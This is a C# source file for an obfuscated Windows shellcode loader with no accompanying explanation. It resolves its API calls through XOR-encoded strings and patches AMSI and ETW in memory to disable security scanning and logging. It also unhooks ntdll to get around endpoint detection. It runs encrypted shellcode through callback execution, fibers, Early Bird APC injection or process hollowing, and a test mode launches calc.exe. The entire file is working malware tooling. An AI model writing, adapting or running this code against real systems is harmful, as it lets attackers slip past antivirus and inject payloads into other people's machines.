using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace Ev
{
    static class Pr
    {
        // ══ bootstrap P/Invoke (only 3 functions — every .NET app has these) ══
        [DllImport("kernel32", SetLastError = true)]
        static extern IntPtr LoadLibrary(string lpFileName);
        [DllImport("kernel32", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        // ══ delegate types (resolved at runtime via GetProcAddress) ══
        delegate IntPtr dGM(string n);
        delegate IntPtr dGP(IntPtr m, string n);
        delegate IntPtr dVA(IntPtr a, uint z, uint t, uint p);
        delegate IntPtr dVAE(IntPtr h, IntPtr a, uint z, uint t, uint p);
        delegate bool dWPM(IntPtr h, IntPtr a, byte[] b, uint z, out uint w);
        delegate IntPtr dCRT(IntPtr h, IntPtr t, uint s, IntPtr a, IntPtr p, uint f, IntPtr i);
        delegate IntPtr dOP(uint d, bool i, int p);
        delegate bool dCP(string a, string c, IntPtr p, IntPtr t, bool i, uint f, IntPtr e, string d, ref SI s, out PI o);
        delegate uint dRT(IntPtr h);
        delegate uint dQA(IntPtr f, IntPtr t, IntPtr d);
        delegate uint dST(IntPtr h);
        delegate bool dGT(IntPtr h, byte[] c);
        delegate bool dSC(IntPtr h, byte[] c);
        delegate bool dCH(IntPtr h);
        delegate IntPtr dCF(uint z, IntPtr a, IntPtr p);
        delegate IntPtr dCTF(IntPtr p);
        delegate void dSTF(IntPtr f);
        delegate bool dEW(IntPtr f, IntPtr p);
        delegate uint dWE(string cmd, uint show);

        // ══ resolved function pointers ══
        static dGM _gm; static dGP _gp; static dVA _va; static dVAE _vae;
        static dWPM _wp; static dCRT _ct; static dOP _op; static dCP _cp;
        static dRT _rt; static dQA _qa; static dST _st; static dGT _gt;
        static dSC _sc; static dCH _ch; static dCF _cf; static dCTF _ctf;
        static dSTF _sf; static dEW _ew; static dWE _we;

        [StructLayout(LayoutKind.Sequential)]
        struct SI { public int cb; public IntPtr r, d, t; public int x, y, xs, ys, xc, yc, fa; public short ws, cr2; public IntPtr r2, si, so, se; }

        [StructLayout(LayoutKind.Sequential)]
        struct PI { public IntPtr hp, ht; public int pid, tid; }

        // ══ string obfuscation ══
        // X(): rolling-XOR decode (used for API names resolved via GetProcAddress)
        static string X(byte[] d, int k)
        {
            char[] r = new char[d.Length];
            int s = k;
            for (int i = 0; i < d.Length; i++) { r[i] = (char)(d[i] ^ (byte)(s & 0xFF)); s = (s * 1103515245 + 12345) & 0x7FFFFFFF; }
            return new string(r);
        }

        // Ds(): base64 + rolling-key XOR decode (used for command-line modes)
        static string Ds(string e)
        {
            byte[] d = Convert.FromBase64String(e);
            byte k = 0x5A;
            for (int i = 0; i < d.Length; i++) { d[i] ^= k; k = (byte)((k * 7 + 19) & 0xFF); }
            return Encoding.ASCII.GetString(d);
        }

        static byte[] Xor(byte[] d, byte[] k) { var r = new byte[d.Length]; for (int i = 0; i < d.Length; i++) r[i] = (byte)(d[i] ^ k[i % k.Length]); return r; }

        static T M<T>(IntPtr m, string n) where T : Delegate
        {
            var a = GetProcAddress(m, n);
            if (a == IntPtr.Zero) return null;
            return Marshal.GetDelegateForFunctionPointer<T>(a);
        }

        static void InstrPatch(IntPtr addr, byte[] data)
        {
            VirtualProtect(addr, (uint)data.Length, 0x04, out uint o);
            Marshal.Copy(data, 0, addr, data.Length);
            VirtualProtect(addr, (uint)data.Length, o, out _);
        }

        // ══ one-time API resolution ══
        static bool _initDone = false;
        static void Init()
        {
            if (_initDone) return;
            _initDone = true;

            IntPtr k32 = LoadLibrary(X(new byte[] { 0x7C, 0x61, 0x9F, 0x4C, 0xD6, 0x1C, 0xDA, 0x5C, 0x21, 0xF8, 0xC9, 0x16 }, 23));
            IntPtr u32 = LoadLibrary(X(new byte[] { 0x62, 0x77, 0x88, 0x50, 0x80, 0x42, 0xC7, 0x0A, 0x63, 0xF0 }, 23));

            _gm = M<dGM>(k32, X(new byte[] { 0x1D, 0xEE, 0x1C, 0xCC, 0x49, 0x03, 0x61, 0xD1, 0xD7, 0x4B, 0xE1, 0xD7, 0x9A, 0x33, 0xC9, 0x22 }, 90));
            _gp = M<dGP>(k32, X(new byte[] { 0x1B, 0x00, 0x4E, 0xBB, 0x3A, 0x8E, 0x65, 0x86, 0x90, 0x79, 0xE0, 0x06, 0x13, 0x6A }, 92));
            _va = M<dVA>(k32, X(new byte[] { 0x37, 0xEF, 0x35, 0x00, 0xE8, 0x73, 0x8F, 0xA1, 0xF5, 0x32, 0x50, 0x6F }, 97));
            _vae = M<dVAE>(k32, X(new byte[] { 0x37, 0xEF, 0x35, 0x00, 0xE8, 0x73, 0x8F, 0xA1, 0xF5, 0x32, 0x50, 0x6F, 0x10, 0x12 }, 97));
            _wp = M<dWPM>(k32, X(new byte[] { 0x79, 0xBD, 0x35, 0x11, 0x5F, 0xBB, 0x3A, 0x8E, 0x65, 0xA2, 0x87, 0x6E, 0xDF, 0x06, 0x0D, 0x76, 0xAC, 0xC6 }, 46));
            _ct = M<dCRT>(k32, X(new byte[] { 0x11, 0x51, 0x45, 0xB8, 0xEA, 0x1A, 0x1E, 0xF0, 0xC7, 0xF4, 0x4C, 0x74, 0x22, 0x1F, 0x96, 0x28, 0x63, 0x77 }, 82));
            _op = M<dOP>(k32, X(new byte[] { 0x19, 0xA7, 0xA1, 0xC3, 0xB2, 0x01, 0x5F, 0xCA, 0x4B, 0xBC, 0x2F }, 86));
            _cp = M<dCP>(k32, X(new byte[] { 0x11, 0x51, 0x45, 0xB8, 0xEA, 0x1A, 0x1C, 0xE7, 0xC5, 0xF8, 0x5D, 0x62, 0x05, 0x20 }, 82));
            _rt = M<dRT>(k32, X(new byte[] { 0x5B, 0x6B, 0x5C, 0x49, 0xA8, 0x7F, 0x1F, 0x40, 0x33, 0x83, 0x46, 0xB0 }, 9));
            _qa = M<dQA>(k32, X(new byte[] { 0x4B, 0x3E, 0x4D, 0x34, 0x83, 0x72, 0xA7, 0x18, 0x00, 0x82, 0x10, 0x3A }, 26));
            _st = M<dST>(k32, X(new byte[] { 0x51, 0x66, 0x23, 0x39, 0x2B, 0x01, 0x18, 0x51, 0x32, 0xF9, 0x0D, 0xE0, 0x42 }, 2));
            _gt = M<dGT>(k32, X(new byte[] { 0x5D, 0x2E, 0x5C, 0x15, 0x8E, 0x55, 0xB1, 0x1C, 0x16, 0x80, 0x2F, 0x17, 0xCA, 0x7A, 0x14, 0x41 }, 26));
            _sc = M<dSC>(k32, X(new byte[] { 0x49, 0x2E, 0x5C, 0x15, 0x8E, 0x55, 0xB1, 0x1C, 0x16, 0x80, 0x2F, 0x17, 0xCA, 0x7A, 0x14, 0x41 }, 26));
            _ch = M<dCH>(k32, X(new byte[] { 0x2D, 0x63, 0xF3, 0xD6, 0x1F, 0x63, 0xE9, 0x4F, 0x22, 0x6B, 0x51 }, 110));
            _cf = M<dCF>(k32, X(new byte[] { 0x11, 0x51, 0x45, 0xB8, 0xEA, 0x1A, 0x0A, 0xFC, 0xC8, 0xFE, 0x4A }, 82));
            _ctf = M<dCTF>(k32, X(new byte[] { 0x51, 0x8C, 0x8E, 0xEF, 0x3B, 0x4D, 0x78, 0x01, 0x02, 0x29, 0x9D, 0xB0, 0x52, 0x63, 0xCB, 0x4B, 0xAB, 0xB1, 0x75, 0x7B }, 18));
            _sf = M<dSTF>(k32, X(new byte[] { 0x18, 0x5F, 0x28, 0x92, 0x44, 0xBC, 0x29, 0x1D, 0x85, 0x29, 0x1B, 0xDB, 0x6D }, 75));
            _ew = M<dEW>(u32, X(new byte[] { 0x3F, 0x45, 0xFD, 0x4C, 0x11, 0x6E, 0x5A, 0x39, 0xBD, 0xD4, 0xD3 }, 122));
            _we = M<dWE>(k32, X(new byte[] { 0x34, 0x09, 0x77, 0x9B, 0xC7, 0xE9, 0xB6 }, 99));
        }

        // ═══════════════════════════════════════════
        //  AMSI Bypass
        // ═══════════════════════════════════════════
        static void DoAmsi()
        {
            string amsiDll = Ds("O+ShuOT9Lo0=");
            string funcName = Ds("G+ShuJn6I4943NSXz8s=");

            IntPtr m = LoadLibrary(amsiDll);
            if (m == IntPtr.Zero) return;
            IntPtr f = GetProcAddress(m, funcName);
            if (f == IntPtr.Zero) return;

            // mov eax, 0x80070057; ret — XOR-obfuscated
            byte[] patch = Xor(
                new byte[] { 0xF0, 0xC9, 0x7B, 0x3F, 0x89, 0x60 },
                new byte[] { 0x48, 0x9E, 0x7B, 0x38, 0x09, 0xA3 }
            );
            InstrPatch(f, patch);
        }

        // ═══════════════════════════════════════════
        //  ETW Bypass
        // ═══════════════════════════════════════════
        static void DoEtw()
        {
            string ntdllDll = Ds("NP22vaa3Jo1W");
            string funcName = Ds("H/2llLz8LJVt29uFzw==");

            IntPtr m = _gm != null ? _gm(ntdllDll) : LoadLibrary(ntdllDll);
            if (m == IntPtr.Zero) return;
            IntPtr f = _gp != null ? _gp(m, funcName) : GetProcAddress(m, funcName);
            if (f == IntPtr.Zero) return;

            // xor rax,rax; ret — XOR-obfuscated
            byte[] patch = Xor(
                new byte[] { 0xDC, 0x80, 0x40, 0x00 },
                new byte[] { 0x94, 0xB3, 0x80, 0xC3 }
            );
            InstrPatch(f, patch);
        }

        // ═══════════════════════════════════════════
        //  NTDLL Unhook
        // ═══════════════════════════════════════════
        static void DoUnhook()
        {
            string ntdllDll = Ds("NP22vaa3Jo1W");
            IntPtr ntdll = _gm(ntdllDll);
            if (ntdll == IntPtr.Zero) return;

            string path = @"C:\Windows\System32\ntdll.dll";
            byte[] clean = File.ReadAllBytes(path);
            if (clean.Length == 0) return;

            int peOff = BitConverter.ToInt32(clean, 0x3C);
            ushort sections = BitConverter.ToUInt16(clean, peOff + 6);
            ushort optSize = BitConverter.ToUInt16(clean, peOff + 20);
            int secOff = peOff + 24 + optSize;

            for (int i = 0; i < sections; i++)
            {
                int o = secOff + i * 40;
                string name = Encoding.ASCII.GetString(clean, o, 8).TrimEnd('\0');
                if (name != ".text") continue;

                uint va = BitConverter.ToUInt32(clean, o + 12);
                uint rawSize = BitConverter.ToUInt32(clean, o + 16);
                uint rawOff = BitConverter.ToUInt32(clean, o + 20);

                IntPtr target = IntPtr.Add(ntdll, (int)va);
                byte[] cleanText = new byte[rawSize];
                Array.Copy(clean, (int)rawOff, cleanText, 0, (int)rawSize);

                VirtualProtect(target, rawSize, 0x04, out uint old);
                Marshal.Copy(cleanText, 0, target, (int)rawSize);
                VirtualProtect(target, rawSize, old, out _);
                break;
            }
        }

        // ═══════════════════════════════════════════
        //  Built-in Test: WinExec calc.exe (no shellcode, no VirtualAlloc)
        // ═══════════════════════════════════════════
        static void DoTest()
        {
            DoAmsi();
            DoEtw();
            // Direct P/Invoke — no shellcode, no VirtualAlloc, no CreateThread
            _we(Ds("Oei+suT8OoQ="), 1);
        }

        // ═══════════════════════════════════════════
        //  Shellcode Exec — EnumWindows Callback
        // ═══════════════════════════════════════════
        static void ExecSC(byte[] sc)
        {
            IntPtr addr = _va(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
            if (addr == IntPtr.Zero) return;
            Marshal.Copy(sc, 0, addr, sc.Length);

            int dummy = Environment.TickCount;
            dummy = (dummy * 0x1F3 ^ dummy >> 3) & 1;
            if (dummy == 0 || dummy == 1) { _ew(addr, IntPtr.Zero); }

            GC.KeepAlive(dummy);
        }

        // ═══════════════════════════════════════════
        //  Early Bird APC Injection
        // ═══════════════════════════════════════════
        static void DoEarlyBird(byte[] sc, string target)
        {
            SI si = new SI(); si.cb = Marshal.SizeOf<SI>(); PI pi;

            if (!_cp(null, target, IntPtr.Zero, IntPtr.Zero, false, 0x00000004, IntPtr.Zero, null, ref si, out pi))
                return;

            IntPtr addr = _vae(pi.hp, IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
            if (addr == IntPtr.Zero) { _ch(pi.hp); _ch(pi.ht); return; }

            _wp(pi.hp, addr, sc, (uint)sc.Length, out _);
            _qa(addr, pi.ht, IntPtr.Zero);
            _rt(pi.ht);

            _ch(pi.hp); _ch(pi.ht);
        }

        // ═══════════════════════════════════════════
        //  Process Hollowing
        // ═══════════════════════════════════════════
        static void DoHollow(byte[] sc, string target)
        {
            SI si = new SI(); si.cb = Marshal.SizeOf<SI>(); PI pi;

            if (!_cp(null, target, IntPtr.Zero, IntPtr.Zero, false, 0x00000004, IntPtr.Zero, null, ref si, out pi))
                return;

            IntPtr addr = _vae(pi.hp, IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
            _wp(pi.hp, addr, sc, (uint)sc.Length, out _);

            byte[] ctx = new byte[1232];
            BitConverter.GetBytes((uint)0x10007).CopyTo(ctx, 0);

            if (!_gt(pi.ht, ctx)) { _ch(pi.hp); _ch(pi.ht); return; }

            byte[] rip = BitConverter.GetBytes((ulong)addr);
            Array.Copy(rip, 0, ctx, 0xF8, 8);

            _sc(pi.ht, ctx);
            _rt(pi.ht);

            _ch(pi.hp); _ch(pi.ht);
        }

        // ═══════════════════════════════════════════
        //  AES-256-CBC Decrypt Helper
        // ═══════════════════════════════════════════
        static byte[] AesDec(byte[] ct, byte[] key, byte[] iv)
        {
            using var a = Aes.Create();
            a.KeySize = 256; a.Mode = CipherMode.CBC; a.Padding = PaddingMode.PKCS7;
            a.Key = key; a.IV = iv;
            using var d = a.CreateDecryptor();
            return d.TransformFinalBlock(ct, 0, ct.Length);
        }

        static byte[] HexToBytes(string h)
        {
            int n = h.Length / 2;
            byte[] r = new byte[n];
            for (int i = 0; i < n; i++)
                r[i] = Convert.ToByte(h.Substring(i * 2, 2), 16);
            return r;
        }

        // ═══════════════════════════════════════════
        //  Main
        // ═══════════════════════════════════════════
        static void Main(string[] args)
        {
            Init();

            if (args.Length == 0)
            {
                Console.WriteLine(Ds("G9/9lI7LYqRMyMGYxdcCdyjp7jHfqmNGn9NSdB7Xhzm/KW48JX2nX5pyUwNNSv+L1yZ29HljosMDGZPCmVQDrCng8rOz6SOSSYTXhd2ZV29ypv16qqpqRJaFEV4OnMIns2s3I2p8oxPWUFAYWF2C6fUlfv59eeTUFgU="));
                return;
            }

            string mode = args[0].ToLowerInvariant();

            string mBypassAmsi = Ds("OPCisLnqb4BX2ts=");
            string mBypassEtw  = Ds("OPCisLnqb4RO3g==");
            string mUnhook     = Ds("L+e6vqXy");
            string mShellcode  = Ds("KeG3vab6LYVf");
            string mFiber      = Ds("POCwtLg=");
            string mEarlybird  = Ds("P+igvbP7K5Ne");
            string mHollow     = Ds("Mua+vaXu");
            string mFull       = Ds("PPy+vQ==");
            string mTest       = Ds("LuyhpQ==");

            if (mode == mTest)
            {
                DoTest();
            }
            else if (mode == mBypassAmsi)
            {
                DoAmsi(); DoEtw();
                while (true) Thread.Sleep(60000);
            }
            else if (mode == mBypassEtw)
            {
                DoEtw();
            }
            else if (mode == mUnhook)
            {
                DoUnhook();
            }
            else if (mode == mShellcode && args.Length >= 2)
            {
                byte[] sc = File.ReadAllBytes(args[1]);
                if (args.Length >= 4)
                    sc = AesDec(sc, HexToBytes(args[2]), HexToBytes(args[3]));
                DoAmsi(); DoEtw(); DoUnhook();
                ExecSC(sc);
            }
            else if (mode == mFiber && args.Length >= 2)
            {
                byte[] sc = File.ReadAllBytes(args[1]);
                if (args.Length >= 4)
                    sc = AesDec(sc, HexToBytes(args[2]), HexToBytes(args[3]));
                DoAmsi(); DoEtw(); DoUnhook();
                IntPtr addr = _va(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
                Marshal.Copy(sc, 0, addr, sc.Length);
                IntPtr fib = _cf(0, addr, IntPtr.Zero);
                _ctf(IntPtr.Zero);
                _sf(fib);
            }
            else if (mode == mEarlybird && args.Length >= 3)
            {
                byte[] sc = File.ReadAllBytes(args[1]);
                if (args.Length >= 5)
                    sc = AesDec(sc, HexToBytes(args[3]), HexToBytes(args[4]));
                DoAmsi(); DoEtw(); DoUnhook();
                DoEarlyBird(sc, args[2]);
            }
            else if (mode == mHollow && args.Length >= 3)
            {
                byte[] sc = File.ReadAllBytes(args[1]);
                if (args.Length >= 5)
                    sc = AesDec(sc, HexToBytes(args[3]), HexToBytes(args[4]));
                DoAmsi(); DoEtw(); DoUnhook();
                DoHollow(sc, args[2]);
            }
            else if (mode == mFull && args.Length >= 3)
            {
                byte[] sc = File.ReadAllBytes(args[1]);
                // AES decrypt if key+IV provided (hex strings)
                if (args.Length >= 5)
                    sc = AesDec(sc, HexToBytes(args[3]), HexToBytes(args[4]));
                DoAmsi(); DoEtw(); DoUnhook();
                DoEarlyBird(sc, args[2]);
            }
        }
    }
}
